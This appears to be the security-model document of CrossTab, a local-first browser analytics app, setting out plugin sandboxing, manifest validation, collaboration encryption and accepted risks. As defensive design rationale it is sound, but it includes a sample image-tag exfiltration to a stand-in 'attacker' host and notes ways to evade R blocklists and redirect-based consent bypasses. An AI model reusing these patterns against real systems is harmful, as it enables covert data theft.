# CrossTab security model

CrossTab is a **local-first, client-only** application: there is no server we run
and no backend that holds data. Everything runs in the browser (WebR/R-WASM +
DuckDB-WASM), and persistence is local (OPFS / IndexedDB / localStorage). That
shape determines what is and isn't a meaningful threat.

The one place data leaves the device is **live collaboration (#148)** — an opt-in,
off-by-default peer-to-peer mode where two browsers co-author a project directly.
It adds no backend (rendezvous is over public brokers; the data is peer-to-peer),
but it *is* a real network surface, so it has its own section below
(*"Live collaboration — the P2P networking surface"*).

## What we defend against

1. **Untrusted third-party plugins.** Plugins are the extensibility story and are
   treated as untrusted code. Each runs in a `sandbox="allow-scripts"` iframe with
   **no** `allow-same-origin` (opaque origin, isolated heap); the engine never
   `import()`s, `eval`s, or otherwise runs plugin source in the host realm — it
   fetches the text and `postMessage`s it into the sandbox. Plugin → host calls go
   through an explicit allowlist broker; message identity is established by
   `event.source` window identity (unforgeable across an opaque-origin boundary),
   not by origin string.
2. **Untrusted shared files.** A `.crosstab` project bundle or a `.ctplugin`
   package may come from someone else. Opening one must never auto-execute plugin
   code, and rendered file content must never become script in the host origin.
3. **A malicious link** (`?launch=…`).
4. **Runtime-CDN supply chain** (WebR / DuckDB / R packages) — see "Deferred".

## What we explicitly do **not** treat as a vulnerability (by design)

These are conscious trade-offs for a local single-user tool. They are documented
here so the decision is on record, not rediscovered as "bugs".

### Activated plugins are trusted with the active dataset

`app.data.*` (`getDataFrame`, `getColumns`, `getRows`, …) resolves to the
**currently-active dataset** for any activated plugin. The per-action variable
picker is a *convenience* (it decides what gets bound into R for that run), **not**
an enforcement boundary — a plugin can read the whole active dataset regardless of
what the user selected for it. Activation is the trust decision: enabling a plugin
grants it the active dataset. Combined with the consented `app.web.get`
(see below) this is the intended capability surface, not a leak.

*Mitigation that remains:* `app.web.get` requires per-site user consent, so a
plugin reading the data still cannot send it off-device without an explicit allow.
(WebR network egress is a known gap — see "Deferred", #4.)

**Writes are additive, not destructive.** The trust above is read trust; the write
surface is deliberately narrower. An activated plugin can **create new** datasets
(`app.data.create`), switch which one is active (`app.data.setActive`), and write
its **own** workspace state (`app.state.write`). It **cannot** destructively replace,
append-into, or join-over your loaded data: `DataStore.loadDataset` in those modes is
host-only and reached solely through a user-initiated **File ▸ Import** (see
`core/import-service.js`). A `selfCommit` importer builds its own dataset via the
additive calls above instead of delivering one — so the boundary is *additive vs
destructive*, not *host vs plugin*. Worst case, a malicious activated plugin litters
new datasets; it cannot silently overwrite the data you have open.

**Workspace state: integrity, not secrecy (#145).** Plugin workspace blobs
(`app.state.*`, e.g. CAQDAS coding) are **not** treated as confidential from other
activated plugins — consistent with datasets being world-readable to any activated
plugin, and honest about the fact that a blob is just derived data (a codebook,
codings) with no claim to a stronger secrecy class than the dataset it derives from.
What the store *does* enforce is **integrity**: state is keyed by `(owner, workspace
id, dataset)`, where the owner is derived from the plugin's host-asserted identity
(built-ins share one `builtin` owner; others get an author/host namespace). Because
the owner is part of the key, a plugin can only ever write its **own** slot, and two
different authors declaring the same workspace id get **separate slots** — so one
plugin cannot corrupt, clobber, or squat another's state. There is no runtime
"first-accessor claims" race (an earlier model had one, letting a same-id plugin
read/corrupt a just-imported blob; that is closed by construction now). Reads address
the caller's own owner by default; that is an *addressing* default, not a claimed
barrier — nothing is promised to be unreadable, so nothing is over-promised.

### A plugin manifest is untrusted input (#197)

Found by the owner asking a question this file could not answer: *"The app is building
plugin identities from strings in the plugin manifest. Are those string inputs sanitized?
Is any of the plugin manifest sanitized before processing?"* The answer was **no** — the
only check in the whole path was whether an id existed at all.

**Why two earlier audits missed it, which is worth more than the fix.** Both passes (#89
pre-launch, the 2026-07 plugin audit) were organised around *capability*: what can an
activated plugin **reach** — the active dataset, the network, another plugin's records.
Against that frame, sanitising a manifest looks pointless, because a plugin that is
already trusted with the data has nothing to gain by lying in its metadata. The frame has
no row for the manifest because the manifest is not a capability the plugin wields
against the data — **it is the evidence the USER weighs when deciding whether to grant
the capability in the first place.** An audit that asks only "what can it do once trusted"
will never ask "what does the user see when deciding to trust it".

**What was and was not at risk.** Checked rather than assumed, because the fix stays small
only if the claims are accurate:

- *Not* HTML injection. Every render path uses `textContent` or `el({text})`, and the two
  `innerHTML` templates that interpolate a manifest value call `escapeHtml`.
- *Not* key corruption through save/load. `JSON.stringify` escapes NUL and lone surrogates
  as ASCII `\uXXXX`, so a storage key containing either round-trips through a UTF-8
  project file losslessly. The string-ingress problem fixed for column names does not
  reach plugin keys.
- *Not* filenames. OPFS source keys are `local:<uuid>`, never manifest strings.
- *Not* boot. `writeJSON` catches quota errors and returns false; an oversized manifest
  fails to persist instead of breaking a launch.
- *Not* R injection. `rPackages` goes to WebR's own `installPackages`, not into R source
  we build by hand.

**What was at risk was identity, and it defeated a protection this project built on
purpose.** `qualifyId` namespaces a non-built-in id so a would-be forgery "reads as
exactly what it is: `sdsu-builtin-frequencies`" — which assumes the string renders as its
characters. A single U+202E breaks that, and `core/plugin-manager.js` interpolates both
the id and the name into `confirm()` prompts, where a newline forges extra lines of dialog
text in the app's own voice ("Replace it with this one?" followed by whatever the plugin
cares to assert). `#ensureIdAvailable` compares exact strings, so two ids differing only
by a zero-width character both installed and were indistinguishable in the picker.

**Two policies, because a key and a label are not the same kind of string.**

- **Keys are VALIDATED and the manifest is REJECTED** — `manifest.id` and collection ids
  must match `[A-Za-z0-9][A-Za-z0-9._-]{0,63}`. Cleaning a key silently is how two
  plugins come to share one: uniqueness is checked by exact comparison, so a character
  stripped afterwards leaves the check guarding a value that no longer exists. Validation
  runs inside `qualifyId`, which `#ensureIdAvailable` already calls, so a bad manifest
  never reaches the catalogue. A plugin already installed with a now-invalid id fails in
  isolation: `#activateEntry` catches, reports "Failed to load plugin <name>", and boot
  continues.
- **Display text is CLEANED to equal its own rendering** — `identityText` in
  `core/plugin-stdlib.js`, applied once at `#recordCatalog`, the single boundary where an
  outside manifest becomes state the app stores and draws. It strips bidi overrides and
  isolates, the zero-width space and the BOM, sweeps control characters, repairs lone
  surrogates and bounds the length. It deliberately **keeps** U+200C/U+200D, which are
  letters in Persian, Hindi and other scripts — deleting them would corrupt a real
  author's name. The confusability they permit is closed on the id instead, which is
  ASCII-only and is the string uniqueness is actually checked against.

The error message is sanitised too: the complaint about an unsafe id reaches the same
`confirm()` surfaces the id was going to abuse, so a validator quoting its input verbatim
would re-introduce what it exists to stop.

**One real bug fell out of it.** `URL.host` carries the port, so a plugin served from
`https://example.com:8080/p.js` got the id `example.com:8080:thing` — two colons, and
`ownerToken` splits on the first, leaving the namespace `example.com` with `8080:thing`
dangling. An IPv6 literal arrives bracketed and full of colons. Now `hostname`, slugged,
with a test asserting **exactly one colon** in every qualified id.

### Cross-plugin reads are an offer the owner makes, not a wall (#196)

Item records (`app.items.*` — CAQDAS codings, map layers, agreement rater sets) follow
the same rule as workspace state above, and the owner token that keys them was **fixed**
in the same pass that wrote this section. Two things changed.

**1. An owner token is an authority, and it was being read off a name.** Every plugin
resolving to the same token can read *and write* the same records, and the token was
derived from the qualified plugin id — which `core/loader.js~qualifyId` builds for
collision avoidance (#102), not as a permission. For a URL plugin the prefix is the host
out of the URL the user typed, which is evidence. For a file, authored or packaged plugin
it was `manifest.author`, which the plugin asserts about itself. So a plugin installed
from a file declaring `author: "Acme Labs"` landed in `ns:acme-labs` — Acme's own token —
and could **write** their records; and every plugin that omitted the field shared one
`ns:local` domain. Separately, a **site plugin** sets `builtin` so the manager catalogues
it and refuses to delete it (#185), and the token tested that flag first, handing
deployment-provided code the data domain of all sixty built-ins.

The rule now: **verifiable provenance earns a shared namespace, unverifiable provenance
gets isolation.** Built-in → `builtin`; site → `site:<namespace>`; URL → `ns:<host>`;
file/authored/packaged → `plugin:<id>`. A developer who wants their own plugins to share
a domain can serve them from their own host, where the namespace is a fact rather than an
assertion. `manifest.author` still names and displays; it grants nothing. Pinned by
`test/plugin-data-domain.test.mjs`, which asserts PAIRS rather than string shapes.

**2. A collection may declare itself readable.** `collections[].read` is `'owner'`
(default) or `'public'`; `'public'` means **any activated plugin may read it**, with no
reading-side declaration and no per-reader consent prompt. Decided by the owner
(2026-11-01) from three options. Writes stay owner-only on every surface — there is
deliberately no `writeTo`, so a public collection has exactly one author and any number
of readers, which is what keeps `reads[]` causal edges and `onConcurrentEdit` meaningful.
The policy is one function, `canPluginRead` in `core/collections.js`, because
`core/app.js` cannot be imported outside a browser and a permission check inside it is
one no test can run.

An undeclared collection and an owner-only one return the same empty answer, so this is
not a way to enumerate what a user has installed.

**CAQDAS codings, codes and codebooks are marked `read: 'public'`.** The case: inter-rater
agreement and quantitising are legitimately other people's plugins, and until now they
could read codings only because every built-in shares the `builtin` token — making
"analyse someone else's codings" a built-in privilege by accident. `builtin-agreement`
now reads them through the public path on exactly a third party's terms, which is also
what keeps that path honest: if it breaks, a built-in breaks with it.

#### Accepted residual risk (cross-plugin reads)

- **A coding carries `quote`, a passage of participant speech, and activation discloses
  nothing about data access.** A user who activates a third-party plugin gets no
  indication from the manager that it can read coded interview material. A reading-side
  manifest declaration shown on the plugin card was considered and **not** taken, to keep
  the model one-sided and promptless.
- **Scale of the exposure, stated precisely so it is not over- or under-sold.** It is
  *not* that participant text becomes reachable: `app.data.*` already resolves the whole
  active dataset for any activated plugin (see *Activated plugins are trusted with the
  active dataset*), and a transcript lives in a dataset column, so a plugin that wanted
  the words could always read them. What `read: 'public'` newly exposes is the
  **analysis** — which passages were coded, under which codes, by which coder. That is
  the researchers' judgement and their identities, not new participant data.
- **Consistent with the existing model, not a weakening of it.** This file already states
  that plugin state is *integrity, not secrecy*, and that codings have no claim to a
  stronger secrecy class than the dataset they derive from. `read: 'public'` makes that
  explicit and addressable instead of true-by-accident-of-the-owner-token.
- **The mitigation that remains is the one that always mattered:** `app.web.get` needs
  per-site user consent, so a plugin that reads codings still cannot send them off-device
  without an explicit allow. (WebR egress remains the known gap — see "Deferred", #4.)

### Opening an untrusted bundle reconciles the active plugin set

Opening a `.crosstab` drives the active plugin set to exactly the bundle's list —
activating ones it names and disabling ones it doesn't (`applyActivatedSet`). This
is what makes a shared project reproducible (#102/#118). It **never runs foreign
code**: unknown plugin ids are skipped, and a plugin that *is* present was already
installed and sandboxed on this machine. The bundle reconfigures *which installed
plugins are live*, nothing more. Accepted.

### `?launch=<name>` can open a saved project headlessly

`?launch=` resolves to a preset (`start-blank`/`demo-quant`/`demo-qual`) or, failing
that, to one of **the user's own** locally-saved projects by name, opening it
without the launcher. A crafted link can therefore open one of your saved projects
(and reconcile its plugin set, as above). It cannot load a *foreign* project or
attacker data — it only matches names already in your local catalog — and it runs
no foreign code. This is the shortcut/bookmark feature working as intended. Accepted.

## Fixed in the pre-launch hardening pass (#89)

- **Stored-XSS on project open** — restored Output blocks (`text`, and `table`
  items without a re-renderable spec) are now run through `sanitizeHtml` before
  reaching the host DOM, so a malicious shared `.crosstab` can't inject script via
  saved output. (`core/results-pane.js`)
- **Plugin-name XSS on fork** — the creator dialog title now escapes the source
  plugin's (author-controlled) display name. (`core/plugin-creator.js`)
- **`web.get` consent is per-origin** — an "allow" is remembered **only for the
  host the user saw**; a fetch to a different origin re-prompts. One approval no
  longer authorises fetching from (and exfiltrating to) any host. The legacy
  boolean "any-URL" grant is dropped on upgrade (one-time re-prompt).
  (`core/loader.js`, `core/plugin-manager.js`, `core/app.js`)
- **Workspace-state ownership** — workspace state is keyed by **owner** (part of the
  storage key, derived from the plugin's host-asserted identity), so a plugin can only
  write its **own** slot and two authors declaring the same workspace id get **separate
  slots** — squat-proof by construction, with no runtime trust-on-first-use to defeat.
  A built-in's workspace ids stay **reserved** at the tab level so a non-built-in can't
  hijack a built-in's visible tab (identity, not data — the owner-keyed store isolates
  the data either way). See *"Workspace state: integrity, not secrecy (#145)"* above for
  the full model. (`core/workspace-store.js`, `core/workspace-manager.js`,
  `core/app.js`, `core/plugin-manager.js`)

## Fixed in the post-launch plugin-audit pass (2026-07)

A focused review of the plugin/import surface turned up two gaps against controls
we already intended to enforce; both are closed.

- **`web.get` redirect bypass.** The per-origin consent gate (#89) approved the
  *requested* origin, but the host fetch used the default `redirect: 'follow'`, so a
  grant for a trusted host let its (open-)redirect bounce the request — carrying data
  in the URL — to an origin the user never approved. The host fetch now uses
  `redirect: 'manual'` and rejects any 30x, so the cross-origin hop never fires; the
  data can only reach the exact origin the user consented to. (`core/app.js`.) Trade-off:
  endpoints that rely on redirects (e.g. a Wikipedia REST title that 302s to its
  canonical) must be given as the direct URL; the error says so.
- **Probe-time capability exposure.** *Cataloguing* a plugin (reading its manifest,
  no activation, no consent) built a broker with the full service bundle and imported
  the plugin, whose top-level module code could then RPC `data.*`/`webr.*` — reading
  the active dataset or running R before any trust decision. The probe now gets a
  **deny-all** service bundle (every `app.*` call throws), and `sendLoad` has a 20s
  timeout so a plugin that imports but never returns a manifest can't keep a live,
  capable sandbox attached indefinitely. (`core/loader.js`, `core/plugin-broker.js`.)

## Media sandbox — a narrowly-widened CSP for qualitative coding (#139)

Qualitative coding of audio/image/video must **render** media inside the coding
workspace, but the strict plugin CSP (`default-src 'none'`) blocks every `<audio>`/
`<video>`/`<img>` source. A dedicated CSP **variant** — the single sandbox template
(`plugin-host.html`) with its CSP swapped at load time by `core/plugin-sandbox.js`,
selected for plugins that declare `manifest.media === true`, exactly like the codec
CSP is selected by `manifest.codecs` — widens the policy by **two directives only**:
`media-src blob:` and `img-src blob:`. Only the plugin's *visible workspace* frame
gets it (that is the one that renders); its hidden compute frame stays strict.

- **`blob:` only — never `https:`/`data:` in those directives.** `<img src="https://
  attacker/?leak=…">` is a covert-GET exfiltration channel; allowing a remote scheme
  here would undo the `connect-src 'none'` "a plugin can't phone home" guarantee. Blob
  is same-origin-opaque and unreadable off-device, so it grants *display*, not *reach*.
- **The plugin never fetches, and never touches the store.** It calls
  `app.media.load(ref)` to read (host reads the content-addressed store,
  `core/media-store.js`, and posts back a `Blob` the plugin renders as a blob: URL in
  its own realm) and `app.media.put(file, meta)` to write (an importer plugin hands the
  host-held `File` back **by reference** — no byte copy — and the host streams it to
  OPFS and returns an `asset:<hash>` ref). The plugin only ever holds a ref or a Blob,
  never a handle or a path. Refs resolve **locally only** — `asset:<hash>` (the store)
  or `data:` (inline); any other scheme is rejected, so a ref cannot reach the network
  (the remote-URL fetcher is deliberately deferred, #143/B).
- **Media CSP is granted to a plugin's compute frame too, not just a visible one.** A
  media *importer* decodes/probes its file in the loader's compute frame, so the loader
  grants the media CSP on `manifest.media` (the workspace manager independently grants
  it to a coding workspace's visible frame). Still `blob:`-only, so egress stays closed.
- **No new data exposure.** `media.load` returns the user's own local media bytes to an
  already-activated plugin (already trusted with the active dataset), and `media.put`
  stores the user's own file under a user-initiated import; with egress still closed,
  neither is a new exfiltration surface. Everything that bounds *reach* —
  `connect-src 'none'`, opaque origin, the broker allowlist — is unchanged.

## Live collaboration — the P2P networking surface (#148, on the #143 merge kernel)

Collaboration is **opt-in and off by default**. When two people co-author a project,
CrossTab opens a **peer-to-peer** channel directly between their browsers (WebRTC,
brokered by Trystero over public MQTT relays). There is still **no server we run and
no backend that holds data** — rendezvous uses public brokers, and the project data
travels peer-to-peer, never through them.

**Confidentiality in transit — end-to-end by construction.**

- The data channel (the op-log *and* transferred Parquet) rides WebRTC's **DTLS**,
  which is mandatory in the spec — there is no unencrypted mode to fall into. Because
  no server sits in the data path, the two browsers are the only endpoints, so DTLS
  here *is* end-to-end.
- Signaling (the SDP offer/answer, which carries the DTLS fingerprints and ICE
  candidates) is **AES-256-GCM encrypted** by Trystero under the room secret
  (`key = SHA-256(secret:appId:roomId)`, `core/live-sync.js` → Trystero `crypto.js`).
  So the public broker sees only ciphertext SDP, and — because GCM authenticates — a
  party without the secret cannot forge or tamper with the fingerprints to
  man-in-the-middle the handshake.

**The room secret is the capability.** There are no accounts and no auth (consistent
with the serverless model). Whoever holds a project's invite secret can join its room
and **read and write** that project. Membership *is* the trust decision — the analogue
of "activation" for plugins: you invite a collaborator by sharing the secret and
thereby trust them with that one project. Consequences, on record:

- Share invite links only over a channel you trust; **the link is the key.**
- The secret is **carried inside the exported bundle** (collab identity is
  transport-agnostic, so a flash-drive / OPFS copy can rejoin the same room) — which
  means **the bundle is also the key.** Exports are encrypted by default (#144), which
  is what protects that embedded secret at rest.

**Received edits are trusted (co-authors can change your data).** A peer's ops apply
to your local project — recodes, deletions, new datasets. That is the feature, not a
leak: you joined a shared document. Two integrity properties bound it, and neither
over-claims:

- Transferred base-data bytes are **SHA-256-verified** against the sender's advertised
  hash before they are stored (`core/gap-fill.js`). This catches corruption/tampering
  *in transit* — **not** a malicious sender: a peer with the secret can send
  valid-but-wrong bytes, which is the membership-trust decision again.
- Genuine conflicts are **never silently resolved** — the merge surfaces them to a
  human (`showConflictDialog`); only clean, non-overlapping edits auto-merge.

**Identity is self-asserted.** The names / initials / colours on presence chips and
authorship stamps are chosen locally and are **spoofable**. They support awareness and
inter-coder attribution (κ/α needs *consistent* labels, not *verified* ones) — not
authentication. Attribution is advisory, not forensic.

### Accepted residual risks (collaboration)

- **Signaling metadata to the broker.** The public MQTT broker learns that peers
  rendezvous on a (hashed) room topic, plus timing and the WebSocket connection (hence
  approximate IP). It **cannot** read the SDP or any project data. An institution can
  point at its own broker (`setRelayUrls`) to narrow even this. Accepted.
- **Peer IP exposure.** WebRTC reveals each peer's IP address to the other (inherent to
  P2P) unless all traffic is forced through a relay. A privacy consideration for the
  collaborators, not a data-confidentiality gap. Accepted.
- **No infrastructure, including no TURN.** Default is public STUN (address discovery
  only — nothing we host). Two peers behind symmetric NATs may be unable to connect
  without a **relay the user/institution supplies** (`setTurnConfig`); with none
  reachable, the session simply fails to connect, and the UI must say so (detected ≠
  connectable). Even a relayed session stays DTLS-encrypted end-to-end — the TURN
  operator forwards ciphertext it cannot read. Accepted.

## Accepted residual risks (won't fix)

These are real gaps we have consciously chosen **not** to close, because the
available fixes cost more (in ongoing maintenance or fragility) than the risk
warrants for a local single-user tool. Recorded so the trade-off is deliberate.

- **#4 — WebR network egress.** Plugin-supplied R can reach the network
  (`download.file`, `url()`, `install.packages`) from the host origin, bypassing the
  `web.get` consent gate. Note the *non-fixes*: sanitising R **source** is theatre —
  R is dynamic (`get("url")()`, `do.call`, `eval(parse())`), so any text blocklist is
  trivially bypassed. The only robust fix is a transport-level XHR/`fetch` allowlist
  *inside* the WebR worker, which is sizable and fragile across WebR versions.
  **Accepted, not pursued:** it's partly redundant anyway — activated plugins are
  already trusted with the active dataset (above), so R egress is not a new exposure
  beyond the consented `web.get`. Revisit only if WebR exposes a supported network
  hook that makes the allowlist cheap and stable.
- **#9 — runtime asset integrity.** Cached runtime code (WebR/DuckDB/R packages) has
  no integrity check. TOFU hashing (hash what we download) is theatre — it can't tell
  a legit upgrade from an injection. Pinned SRI would be real defence but requires
  re-vetting and updating hashes on **every** legitimate upstream bump — a
  maintenance burden we're not taking on. **Accepted.** If we ever want the
  protection for free, the clean route is to serve the *vendored* runtime from our
  own origin (the air-gap path, #71, already produces it), which removes the CDN from
  the trusted path with zero ongoing hashing — a deploy-time choice (#90), not a code
  obligation here.
- **#10 — data at rest is plaintext (local storage *and* exports).** The whole project
  bundle persists to **OPFS / IndexedDB / localStorage in the clear**, and DuckDB reads
  the Parquet sources *directly* from OPFS handles (`BROWSER_FSACCESS`,
  `core/duckdb-manager.js`). Exported `.crosstab`/data files land wherever the user saves
  them, also plaintext. **Threat scope — be precise about what this is and isn't:**
  browser storage is **origin-isolated**, so *other websites cannot read it* (that's the
  same-origin threat the platform is built to stop, and it holds). The gap is **local /
  offline access to the bytes** — a stolen or shared machine, a forensic disk image, or a
  backup/sync of the browser profile — where OPFS/IndexedDB are ordinary app-data files
  with no more protection than any other app's. It is **not** a defence against malware
  running *as the user while a project is open* (that reads the decrypted data or scrapes
  the key from memory regardless); at-rest encryption only ever protects the
  powered-off / offline / backup copy.
  - *Why not always-on app-level encryption:* it would be **theatre** unless keyed by a
    secret the machine doesn't store. If the app can auto-decrypt on next launch, the key
    sits on disk beside the ciphertext (a "non-extractable" `CryptoKey` resists *script*
    extraction but still lives in the same profile) — a disk image has both. It is *real*
    only when keyed by a **user passphrase** (or hardware-backed key) entered per session.
    And mandatory encryption would **break the large-data path**: DuckDB's direct-OPFS
    streaming read can't run against ciphertext, so multi-GB Parquet would have to be
    decrypted into memory and OOM.
  - *Primary answer (recommended, documented):* **OS full-disk encryption**
    (BitLocker / FileVault / LUKS) protects *all* app data uniformly, keyed off-disk
    (TPM/login), with zero app cost and no fight with DuckDB. This is the correct at-rest
    control; app-level encryption on top is largely redundant for the stolen-laptop threat.
  - *Optional mitigation — now shipped (#144)* for the FDE-gap (no-FDE machines, shared
    computers) and the off-machine export case: **opt-in passphrase encryption for local
    OPFS storage, default-on (opt-*out*) for exports**, built on the same crypto kernel
    (`core/crypto-envelope.js`: PBKDF2-HMAC-SHA256 → AES-256-GCM, native WebCrypto, key
    derived per session from the passphrase, never persisted). Real, because keyed by a
    user secret; non-taxing, because scoped to who asks for it. Each OPFS project has its
    **own** passphrase (the shared-lab case); the catalog stays plaintext because it spans
    projects with different keys; `File ▸ Encryption settings… ▸ This project` sets
    or clears it in place for both OPFS and folder projects (that tab offers only the
    verbs the current state allows — set a passphrase, or change/remove an existing one). **What it does *not* change:**
    it protects the powered-off / offline / backup copy, never a live session (malware
    running as the user reads the decrypted data regardless), and DuckDB's direct-OPFS
    streaming read still can't run against ciphertext — so the multi-GB path stays on the
    plaintext/FDE posture. **The opt-in is the mitigation; OS full-disk encryption remains
    the primary recommended control.**
